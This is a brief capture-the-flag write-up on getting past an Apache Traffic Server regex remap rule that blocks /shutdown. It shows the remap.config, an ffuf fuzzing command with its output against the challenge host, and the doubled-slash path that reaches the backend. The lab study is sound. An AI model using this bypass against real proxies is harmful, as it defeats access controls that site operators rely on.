# Cessation
![[Pasted image 20210423140708.png]]
## File provided
The file provided appears to be configuration for Apache Traffic Server. I want to request the _/shutdown_ directory, but this directory has been remapped to the _403_ directory.
```bash
cat remap.config 
regex_map http://.*/shutdown http://127.0.0.1/403
regex_map http://.*/ http://127.0.0
```

## Exploitation
I decided to try and fuzz the request after many other attempts to gain access. It appears fuzzing it with an extra _/_ changed the request enough so the proxy does not forward me, but the backend will recieve the request like normal.
```bash
──╼ $ffuf -w /opt/seclists/Fuzzing/special-chars.txt -u http://165.227.231.249:32079/FUZZshutdown

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://165.227.231.249:32079/FUZZshutdown
 :: Wordlist         : FUZZ: /opt/seclists/Fuzzing/special-chars.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

?                       [Status: 200, Size: 4147, Words: 941, Lines: 188]
#                       [Status: 200, Size: 4147, Words: 941, Lines: 188]
/                       [Status: 200, Size: 4199, Words: 940, Lines: 188]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 1 :
```

Sending this request over to BurpSuite shows us the flag.
![[Pasted image 20210423140636.png]]